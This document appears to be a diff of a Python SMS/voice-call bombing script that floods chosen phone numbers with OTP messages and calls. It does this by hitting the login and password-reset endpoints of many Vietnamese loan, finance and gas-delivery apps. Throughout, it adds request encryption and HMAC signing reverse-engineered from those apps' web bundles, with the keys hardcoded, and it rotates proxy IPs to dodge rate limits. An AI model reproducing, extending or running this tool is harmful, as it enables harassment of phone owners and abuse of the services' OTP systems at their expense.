+def _ll_enc(obj: dict) -> str:
+    raw = json.dumps(obj, separators=(",", ":"))
+    ct  = AES.new(_LL_KEY, AES.MODE_ECB).encrypt(pad(raw.encode(), 16))
+    return base64.b64encode(ct).decode()
+
+
+def _ll_dec(b64_str):
+    try:
+        ct    = base64.b64decode(b64_str.strip().strip('"'))
+        plain = unpad(AES.new(_LL_KEY, AES.MODE_ECB).decrypt(ct), 16)
+        return json.loads(plain.decode())
+    except Exception:
+        return None
+
+
+async def Call_LuckyLoan(phone):
+    body = _ll_enc({"phone": phone, "type": "login"})
+    hdrs = {
+        "country": "VN", "Time-Zone": "VNM", "Accept-Language": "vi-VN",
+        "X-Tenant-ID": "10000000", "appId": "80000002", "appName": "LuckyLoan",
+        "Content-Type": "application/json", "User-Agent": "okhttp/4.12.0",
+    }
+    try:
+        async with _make_client(timeout=12) as c:
+            r = await c.post(
+                "https://ll.wpvi.cc/luckyloan/api/v1/user/getVerificationCode",
+                content=body.encode(), headers=hdrs,
+            )
+        print(f"[LuckyLoan] {r.text[:200]}")
+        try:
+            plain = r.json()
+            if isinstance(plain, dict):
+                return plain.get("code") == 200 or plain.get("successful") is True
+        except Exception:
+            pass
+        resp = _ll_dec(r.text)
+        if resp:
+            return resp.get("code") == 200 or resp.get("successful") is True
+        return r.status_code == 200
+    except Exception as e:
+        print(f"[LuckyLoan] ERR {type(e).__name__}: {e}")
+        return False
+
+
+#  KetVang (AES-CBC) 
+_KV_APP_CODE = "7r0h567tq0u98a23v837gm18074y0i0w"
+_KV_KEY      = b"om1ayp5evqZTkQdH"
+_KV_IV       = b"\x00" * 16
+
+
+def _kv_enc(text: str) -> str:
+    ct = AES.new(_KV_KEY, AES.MODE_CBC, _KV_IV).encrypt(pad(text.encode(), 16))
+    return base64.b64encode(ct).decode()
+
+
+def _kv_dec(b64):
+    try:
+        ct    = base64.b64decode(b64)
+        plain = unpad(AES.new(_KV_KEY, AES.MODE_CBC, _KV_IV).decrypt(ct), 16)
+        return json.loads(plain.decode())
+    except Exception:
+        return None
+
+
+async def Call_KetVang(phone):
+    mobile    = phone.lstrip("0")
+    device_id = str(uuid.uuid4())
+    enc_data  = _kv_enc(mobile)
+    hdrs = {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json", "Cache-Control": "no-cache",
+        "APPLICATIONCODE": _KV_APP_CODE, "VERSIONCODE": "2178",
+        "DEVICEID": device_id, "EFLAG": "true", "User-Agent": "okhttp/4.12.0",
+    }
+    try:
+        async with _make_client(timeout=12) as c:
+            r = await c.post(
+                f"https://web.ketvang.net/api/user/login/otp?phone={mobile}&type=2",
+                json={"encryptData": enc_data}, headers=hdrs,
+            )
+        print(f"[KetVang] {r.text[:200]}")
+        raw      = r.json()
+        enc_resp = raw.get("encryptData", "")
+        resp     = _kv_dec(enc_resp) if enc_resp else raw
+        if isinstance(resp, dict):
+            return resp.get("code") in (200, "200", 0, "0")
+        return r.status_code == 200
+    except Exception as e:
+        print(f"[KetVang] ERR {type(e).__name__}: {e}")
+        return False
+
+
+#  SPJ / GAS24H 
+# generateOTP   voice call (code 5335, "ang gi ti ST...")  token lun rng nhng call tht vn 
+# forgotPassword  SMS OTP  tr token/record tht
+# Gi c 2  va c voice call va c SMS
+_SPJ_BASE = "https://spj.daukhimiennam.com"
+_SPJ_UA   = "G24H/260528 CFNetwork/1568.200.51 Darwin/24.1.0"
+
+
+def _spj_q(phone: str, extra: dict | None = None) -> bytes:
+    import secrets as _sec
+    payload = {
+        "app_type": 3, "version_code": "260528", "platform": "ios",
+        "token": _sec.token_hex(16), "acc": phone, "device_imei": str(uuid.uuid4()).upper(),
+        "app_customer_type": 1, "role_id": "", "soft_version": 1,
+        "phone": phone, "username": phone,
+        "gcm_device_token": "aeab06653a92fbaaeb9f55739b09d0534b3d15d77973676fa276e8fad8fd6017",
+        "device_name": "iPhone", "device_os_version": "18.1",
+        "request_timestamp": int(time.time() * 1000),
+        "request_key": uuid.uuid4().hex[:16],
+    }
+    if extra:
+        payload.update(extra)
+    return json.dumps(payload, separators=(",", ":")).encode()
+
+
+async def Call_SPJ(phone):
+    hdrs = {"User-Agent": _SPJ_UA, "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "vi-VN,vi;q=0.9"}
+    ok = False
+    try:
+        async with _make_client(timeout=15, follow_redirects=True, proxy=_current_proxy()) as c:
+            await c.get(_SPJ_BASE + "/", headers={"User-Agent": _SPJ_UA})
+
+            # 1) Voice call  generateOTP lun tr token="" nhng call vn tht
+            r1 = await c.post(
+                _SPJ_BASE + "/api/customer/generateOTP",
+                files={"q": (None, _spj_q(phone))},
+                headers=hdrs,
+            )
+            try:
+                d1 = r1.json()
+            except Exception:
+                d1 = {}
+            voice_ok = d1.get("status") == 1 and d1.get("code") == 5335
+            print(f"[SPJ-voice] code={d1.get('code')} msg={d1.get('message','')[:60]} ok={voice_ok}")
+
+            # 2) SMS  forgotPassword tr token tht khi Suscess Okay
+            r2 = await c.post(
+                _SPJ_BASE + "/api/customer/forgotPassword",
+                files={"q": (None, _spj_q(phone))},
+                headers=hdrs,
+            )
+            try:
+                d2 = r2.json()
+            except Exception:
+                d2 = {}
+            sms_tok = d2.get("token") or d2.get("record")
+            sms_ok  = d2.get("status") == 1 and bool(sms_tok)
+            print(f"[SPJ-sms]   code={d2.get('code')} tok={bool(sms_tok)} msg={d2.get('message','')[:60]} ok={sms_ok}")
+
+        ok = voice_ok or sms_ok
+    except Exception as e:
+        print(f"[SPJ] ERR {type(e).__name__}: {e}")
+    return ok
+
+
+
+#  AntamVay 
+# Reverse-engineered from /js/index-BtXMnlZs.js
+# Encrypt: AES-128-CBC key=2498eb0933a1e642 iv=e04df404fd559f27 PKCS7  base64
+# gc(obj): AES-encrypt JSON string  base64, then base64-encode that base64 string (double-base64)
+# quadrigeminal header: gc(publicParams JSON) where publicParams includes HMAC-SHA256 signature
+# HMAC key: 3655a4d5f11048d50c56d7a3a3c2843f, sorted key-value pairs, exclude: taker/tsort/highway
+_AV_FIELDS = {
+    "appVersion": "fiendhead", "deviceName": "archpilferer", "deviceId": "kanchipuram",
+    "osVersion": "gaydiang", "appMarket": "pinebrook", "sessionId": "voltairianize",
+    "gpsAdid": "pratty", "language": "highway", "signature": "taker",
+    "timestamp": "marduk", "path": "peelin", "nonce": "resolving",
+    "phone": "orthogonalization", "type": "sesquipedalianism", "channel": "sublate",
+}
+_AV_AES_KEY  = b"2498eb0933a1e642"   # 16 bytes  AES-128
+_AV_AES_IV   = b"e04df404fd559f27"   # 16 bytes
+_AV_HMAC_KEY = b"3655a4d5f11048d50c56d7a3a3c2843f"
+_AV_SKIP_SIG = {"taker", "tsort", "highway"}   # excluded from HMAC input
+
+
+def _av_encrypt(plain: str) -> str:
+    """AES-128-CBC PKCS7  base64 string."""
+    cipher = AES.new(_AV_AES_KEY, AES.MODE_CBC, _AV_AES_IV)
+    ct = cipher.encrypt(pad(plain.encode("utf-8"), 16))
+    return base64.b64encode(ct).decode()
+
+
+def _av_gc(obj) -> str:
+    """gc(obj): encrypt JSON  double-base64 (matches JS gc function)."""
+    aes_b64 = _av_encrypt(json.dumps(obj, separators=(",", ":")))
+    return base64.b64encode(aes_b64.encode("utf-8")).decode()
+
+
+def _av_signature(hdr_obj: dict) -> str:
+    sig_str = "".join(
+        f"{k}{v}"
+        for k, v in sorted(hdr_obj.items())
+        if k not in _AV_SKIP_SIG
+    )
+    return hmac.new(_AV_HMAC_KEY, sig_str.encode("utf-8"), hashlib.sha256).hexdigest()
+
+
+async def Call_AntamVay(phone):
+    F     = _AV_FIELDS
+    did   = str(uuid.uuid4())
+    ts    = str(int(time.time() * 1000))
+    nonce = f"{ts}_{uuid.uuid4().hex[:13]}"
+    path  = "/cellae/prorater"
+
+    # Build public params (quadrigeminal header) with real HMAC signature
+    hdr_obj = {
+        F["appVersion"]: "1.0.0",
+        F["deviceName"]: "iPhone",
+        F["deviceId"]:   did,
+        F["gpsAdid"]:    did,
+        F["osVersion"]:  "18.1",
+        F["appMarket"]:  "web-vnm-antamvay",
+        F["sessionId"]:  "",
+        F["language"]:   "vi",
+        F["timestamp"]:  ts,
+        F["path"]:       path,
+        F["nonce"]:      nonce,
+    }
+    hdr_obj[F["signature"]] = _av_signature(hdr_obj)
+
+    # Body: {phone, type:"1", channel:"sms"}
+    body_obj = {F["phone"]: phone, F["type"]: "1", F["channel"]: "sms"}
+
+    try:
+        async with _make_client(timeout=15, ) as c:
+            r = await c.post(
+                "https://antam-vay.com/summarize/cellae/prorater",
+                data={"boatloads": _av_gc(body_obj)},
+                headers={
+                    "Accept":            "application/json, text/plain, */*",
+                    "Content-Type":      "application/x-www-form-urlencoded",
+                    "X-Requested-With":  "XMLHttpRequest",
+                    "User-Agent":        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15",
+                    "quadrigeminal":     _av_gc(hdr_obj),
+                },
+            )
+        print(f"[AntamVay] {r.text[:200]}")
+        try:
+            resp = r.json()
+        except Exception:
+            resp = None
+        if isinstance(resp, dict):
+            code = str(resp.get("prorater", resp.get("code", "")))
+            msg  = resp.get("nontransiency", "")
+            return code in ("0", "00", "1008") or "Suscess Okay" in msg.lower()
+        return r.status_code == 200
+    except Exception as e:
+        print(f"[AntamVay] ERR {type(e).__name__}: {e}")
+        return False
+
+# ── VayVuiLoan ───────────────────────────────────────────────────────────────
+# Crypto reverse-engineered from https://h5.vayvuiloan.com/main.dart.js
+# Mode : AES-192-CBC / PKCS7
+# Key  : toLowerCase(base64(utf8("WJRnVfgiTZxs1dC8")))  →  24 bytes
+# IV   : utf8("WJRnVfgiTZxs1dC8")                       →  16 bytes
+# Sign : hardcoded constant found in dart2js bundle
+_VVL_SEED = b"WJRnVfgiTZxs1dC8"
+_VVL_KEY  = base64.b64encode(_VVL_SEED).decode().lower().encode()   # 24 bytes
+_VVL_IV   = _VVL_SEED                                                # 16 bytes
+_VVL_SIGN = "0f656af82eb1da33221a06d1171db265"
+_VVL_PKG  = "com.vayvuiloan.vonnhanhh5ios"
+_VVL_URL  = "https://vonapi.vayvuiloan.com/api/auth/identity/send-verification-code"
+_VVL_HDRS = {
+    "Content-Type":      "application/json",
+    "deviceType":        "h5",
+    "h":                 "2532",
+    "Accept":            "*/*",
+    "system":            "ios",
+    "w":                 "1170",
+    "channel":           "",
+    "Sec-Fetch-Site":    "same-site",
+    "XK8fRPQ3m6Tsv9JN": "5A2YLDWcez+p4K7B",
+    "useragent":         "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+    "Sec-Fetch-Mode":    "cors",
+    "platform":          "iPhone",
+    "Origin":            "https://h5.vayvuiloan.com",
+    "User-Agent":        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+    "Referer":           "https://h5.vayvuiloan.com/",
+    "vendor":            "Apple Computer, Inc.",
+    "Sec-Fetch-Dest":    "empty",
+    "Accept-Language":   "vi-VN,vi;q=0.9",
+    "Accept-Encoding":   "identity",
+    "Connection":        "keep-alive",
 }
 
+def _vvl_encrypt(obj: dict) -> str:
+    raw = json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode()
+    ct  = AES.new(_VVL_KEY, AES.MODE_CBC, _VVL_IV).encrypt(pad(raw, 16))
+    return base64.b64encode(ct).decode()
 
-async def Call_ConCac29(phone):
+async def vayvuiloan(phone: str) -> bool:
+    dev_id  = hashlib.md5(uuid.uuid4().bytes).hexdigest()
+    payload = {
+        "appsFlyerId": None,
+        "app_version": "1.0.0",
+        "appversion":  "1.0.0",
+        "version":     "1.0.0",
+        "pkg_name":    _VVL_PKG,
+        "timestamp":   str(int(time.time() * 1000)),
+        "sign":        _VVL_SIGN,
+        "imei":        dev_id,
+        "uuid":        dev_id,
+        "phone":       phone,
+        "type":        "2",
+    }
     try:
-        async with _make_client(timeout=30, proxy=_current_proxy()) as client:
+        async with _make_client(timeout=20) as client:
             r = await client.post(
-                "https://h5web.thudofinance.com/fivios/finv/neglected",
-                json={"phone": phone},
-                headers=_FINVAY_HEADERS,
+                _VVL_URL,
+                headers=_VVL_HDRS,
+                json={"data": _vvl_encrypt(payload)},
             )
-        print(r.status_code)
-        return r.status_code == 200
-    except Exception:
+        ok = r.status_code == 200
+        print(f"[VayVuiLoan] {r.status_code} ")
+        return ok
+    except Exception as e:
+        print(f"[VayVuiLoan] ERR {type(e).__name__}: {e}")
         return False
 
+
+# ── HappyDongPro ─────────────────────────────────────────────────────────────
+# Reverse-engineered from https://h5.happydongpro.com/1.0.0/umi.c17ef75c.js
+# Algorithm : AES-128-CBC / PKCS7  (body + response both encrypted)
+# Key (16 B) : base64_decode("YWFqaWFvemljYXNobWVoNQ==") → b"aajiaozicashmeh5"
+# IV  (16 B) : base64_decode("aGFqaWFvemljYXNobWVoNQ==") → b"hajiaozicashmeh5"
+# x_x_path   : AES-CBC encrypt("/login/requestVerifyCode") → constant base64
+# Real API   : POST /h5/<encrypted_path> ; server decrypts x_x_path to route
+_HDPRO_KEY      = base64.b64decode("YWFqaWFvemljYXNobWVoNQ==")   # b"aajiaozicashmeh5"
+_HDPRO_IV       = base64.b64decode("aGFqaWFvemljYXNobWVoNQ==")   # b"hajiaozicashmeh5"
+_HDPRO_BASE     = "https://h5.happydongpro.com"
+_HDPRO_URL      = f"{_HDPRO_BASE}/h5/xmks32xfc8svrvh68p564jhcyaoehqpq"
+# x_x_path is deterministic (fixed IV+key+plaintext) — verified by decryption
+_HDPRO_X_PATH   = "YCoyft17omVLyvU9+jEIkcL8RUweszQyIGJ8TDVcaw0="
+
+
+def _hdpro_enc(obj) -> str:
+    raw = json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode()
+    ct  = AES.new(_HDPRO_KEY, AES.MODE_CBC, _HDPRO_IV).encrypt(pad(raw, 16))
+    return base64.b64encode(ct).decode()
+
+
+def _hdpro_dec(b64: str) -> dict:
+    try:
+        ct    = base64.b64decode(b64)
+        plain = unpad(AES.new(_HDPRO_KEY, AES.MODE_CBC, _HDPRO_IV).decrypt(ct), 16)
+        return json.loads(plain.decode().strip())
+    except Exception:
+        return {}
+
+
+async def Call_HappyDongPro(phone: str) -> bool:
+    # Phone format: 84XXXXXXXXX (strip leading 0, prepend 84)
+    ph84 = "84" + phone.lstrip("0") if phone.startswith("0") else phone
+    body = _hdpro_enc({"phone": ph84, "isVoice": False, "h5": False, "deviceId": ""})
+    hdrs = {
+        "fpPlatform":     "5",
+        "appId":          "35",
+        "language":       "vi-VN",
+        "User-Agent":     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+        "Referer":        f"{_HDPRO_BASE}/login",
+        "country":        "undefined",
+        "Origin":         _HDPRO_BASE,
+        "Sec-Fetch-Dest": "empty",
+        "fpDeviceId":     "",
+        "version":        "1.0.0_4.1.9",
+        "Sec-Fetch-Site": "same-origin",
+        "fingerPrint":    "",
+        "Content-Type":   "application/json",
+        "deviceId":       "",
+        "platform":       "2",
+        "token":          "undefined",
+        "x_x_path":       _HDPRO_X_PATH,
+        "loginPlatform":  "H5",
+        "marketToken":    "undefined",
+        "Accept":         "application/json",
+        "Sec-Fetch-Mode": "cors",
+        "Accept-Language": "vi-VN,vi;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+    }
+    try:
+        async with _make_client(timeout=20) as client:
+            r = await client.post(_HDPRO_URL, headers=hdrs, content=body.encode())
+        d = _hdpro_dec(r.text.strip()) if r.status_code == 200 else {}
+        ok = bool(d.get("successful")) or str(d.get("code", "")) in ("0", "200")
+        msg = d.get("msg") or d.get("message") or r.text[:80]
+        print(f"  [HappyDongPro] {'✓' if ok else '✗'} {phone}  {msg}")
+        return ok
+    except Exception as e:
+        print(f"[HappyDongPro] ERR {type(e).__name__}: {e}")
+        return False
+
+
+# ── VietCalo ─────────────────────────────────────────────────────────────────
+# Same platform as HappyDongPro — identical key/IV/x_x_path confirmed by sniff
+# Differences: host, obfuscated URL path, appId=39, UA "vietcalo", loginPlatform=APP
+# Body has no deviceId field; real_path header exposed in plain text
+_VIETCALO_BASE   = "https://h5.vietcalo.com"
+_VIETCALO_URL    = f"{_VIETCALO_BASE}/h5/kr6oyah641pmtseqvfk88ffcp5xfunkb"
+
+
+async def Call_VietCalo(phone: str) -> bool:
+    ph84 = "84" + phone.lstrip("0") if phone.startswith("0") else phone
+    body = _hdpro_enc({"phone": ph84, "isVoice": False, "h5": False})
+    hdrs = {
+        "appId":          "39",
+        "language":       "vi-VN",
+        "User-Agent":     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) vietcalo",
+        "fpPlatform":     "2",
+        "country":        "undefined",
+        "Referer":        f"{_VIETCALO_BASE}/login",
+        "Origin":         _VIETCALO_BASE,
+        "real_path":      "/login/requestVerifyCode",
+        "fpDeviceId":     "",
+        "version":        "1.0.3_1.1.1",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Site": "same-origin",
+        "fingerPrint":    "",
+        "deviceId":       "",
+        "platform":       "2",
+        "token":          "",
+        "x_x_path":       _HDPRO_X_PATH,
+        "loginPlatform":  "APP",
+        "marketToken":    "",
+        "Accept":         "application/json",
+        "Content-Type":   "application/json",
+        "Accept-Language": "vi-VN,vi;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Sec-Fetch-Mode": "cors",
+    }
+    try:
+        async with _make_client(timeout=20) as client:
+            r = await client.post(_VIETCALO_URL, headers=hdrs, content=body.encode())
+        d   = _hdpro_dec(r.text.strip()) if r.status_code == 200 else {}
+        ok  = bool(d.get("successful")) or str(d.get("code", "")) in ("0", "200")
+        msg = d.get("msg") or d.get("message") or r.text[:80]
+        print(f"  [VietCalo] {'✓' if ok else '✗'} {phone}  {msg}")
+        return ok
+    except Exception as e:
+        print(f"[VietCalo] ERR {type(e).__name__}: {e}")
+        return False
+
+
+async def Call_Zinnexi(phone: str) -> bool:
+    mobile    = phone if phone.startswith("0") else "0" + phone.lstrip("0")
+    device_id = f"jrgox{int(time.time() * 1000)}"
+    hdrs = {
+        "Accept":          "application/json, text/plain, */*",
+        "Content-Type":    "application/json",
+        "X-Channel":       "organic",
+        "Accept-Language": "vn",
+        "User-Agent":      _rand_ua(),
+        "Connection":      "keep-alive",
+    }
+    body = {"mobile": mobile, "channel": "organic", "deviceId": device_id}
+    try:
+        async with httpx.AsyncClient(timeout=15, verify=False) as c:
+            r = await c.post("https://m.zinnexi.com/api-v2/pub/user/otp", json=body, headers=hdrs)
+        print(f"[Zinnexi] {r.status_code} ")
+        return r.status_code == 200 and "OPERATE_OK" in r.text
+    except Exception as e:
+        print(f"[Zinnexi] ERR {type(e).__name__}: {e}")
+        return False
 
 async def main():
     phones = sys.argv[1:21]
@@ -2834,89 +2859,93 @@ async def main():
         print("Usage: python oki.py <phone1> [phone2] ...")
         sys.exit(1)
 
-    print("[ChangeIP] Đang đổi IP proxy...")
+    print("[ChangeIP] Xoay IP Xoay...")
     await _doi_ip()
-
     all_funcs = [
-        (Call_Hedgyv,),
-        (Call_VuiApp0,),
-        (Call_MuaVayLoan,),
+        (Call_ViHeo,),
+        (vayvuiloan,),
+        (Call_Calcvay,),
+        (sentSms_DuoVay,),
+#        (Call_TP_SMS,),
+        (call1,),
+        (random_sao,),
+#        (Call_TienPhong_SMS,),
+        (Call_Blue_SMS,),
+        (Call_AntamVay,),
+        (Call_TuiTien,),
+        (Call_Zinnexi,),
         (giaothong365_register,),
-        (Call_SaoThinhVuong,),
-        (Call_Reve_SMS,),
+        (Call_Vay24h,),
         (call8,),
-        (Call_UVWallet,),
         (Call_Lavi_SMS,),
-        (Call_MarVay_New,),
-        (Call_VuiApp1,),
-        (Call_NganNgan,),
         (Call_HTC_SMS,),
         (vaysuoi,),
         (Vay_Nhanh_SMS,),
-        (Call_VnCreSms,),
         (Call_PTV_SMS,),
         (FB_Finance_SMS,),
         (Call_Vay24h,),
         (Call_Petro_SMS,),
         (Call_AChau_SMS,),
         (anvay,),
-        (Call_HappyGoo,),
-        (Call_HappyGoo_Voice,),
         (Call_SenVay,),
-        (Call_LuckyTien,),
-        (Call_LuckyTien_Voice,),
-        (Call_EasyOkVN,),
-        (Call_EasyOkVN_Voice,),
-        (Call_VuiApp,),
+        (Call_MarVay_New,),
+        (Call_VayDay,),    
         (Call_ITake,),
         (Call_QQ_SMS,),
         (seabankasset,),
         (vaygo,),
-        (Call_Izion24_SMS,),
-        (Call_Izion24_Voice,),
-        (Call_ConCac27,),
-        (Call_Tien24hPro,),
         (giaothong365_forgot,),
         (Call_Wan_SMS,),
-        (Call_VNCreCall,),
-        (Call_FinVuiTeck,),
-        (Call_MarVay_SMS,),
-        (Call_TuiTien,),
-        (Call_MoneyCashLoan,),
-        (Call_V88Dong,),
-        (Call_V88DongVoice,),
+        (Call_VayFast,),
         (hicash,),
         (lotte,),
-        (Call_ConCac29,),
         (vnadmin_2,),
         (Call_VayDep365,),
+        (Call_HappyDongPro,),
+        (Call_VietCalo,),
         (sentSms_FvBanana,),
         (sentSms1,),
         (vayxanh,),
         (vnadmin_1,),
+        (Call_F668,),
         (vnadmin_3,),
+        (Call_LuckyLoan,),
+        (Call_KetVang,),
+        (Call_SPJ,),
     ]
 
     async def safe_call(func, phone):
         try:
             return await asyncio.wait_for(func(phone), timeout=25)
         except Exception as e:
-            print(f"[{func.__name__}] ERR {type(e).__name__}: {e}")
+            print(f"[{func.__name__}] Lỗi {type(e).__name__}: {e}")
             return False
 
     max_cycles = 1
     cycle = 0
+
     while cycle < max_cycles:
         cycle += 1
-        print(f"\n{'='*50}\n[VÒNG {cycle}/{max_cycles}] Bắt đầu {len(all_funcs)} hàm\n{'='*50}")
-        for func, *_ in all_funcs:
-            results = await asyncio.gather(*[safe_call(func, phone) for phone in phones])
-            if any(results):
-                print(f"[{func.__name__}] ✅ OK — đợi 2s ->  8s ")
-                await asyncio.sleep(random.randint(6, 8))
-        print(f"[VÒNG {cycle}/{max_cycles}] Hoàn thành.")
-    print(f"\nĐã chạy đủ {max_cycles} vòng, dừng chương trình.")
 
+        print(
+            f"\n{'='*60}\n"
+            f"🚀 VÒNG {cycle}/{max_cycles}\n"
+            f"📌 Bắt đầu thực thi {len(all_funcs)} hàm\n"
+            f"{'='*60}"
+        )
+
+        for func, *_ in all_funcs:
+            results = await asyncio.gather(
+                *[safe_call(func, phone) for phone in phones]
+            )
+
+            if any(results):
+                print(f"[{func.__name__}] ✅ Thành công, chờ 6–10 giây")
+                await asyncio.sleep(random.randint(6, 10))
+
+        print(f"[VÒNG {cycle}/{max_cycles}] ✅ Hoàn thành.")
+
+    print(f"\n🎉 Đã chạy xong {max_cycles} vòng, dừng chương trình.")
 
 if __name__ == "__main__":
     asyncio.run(main())
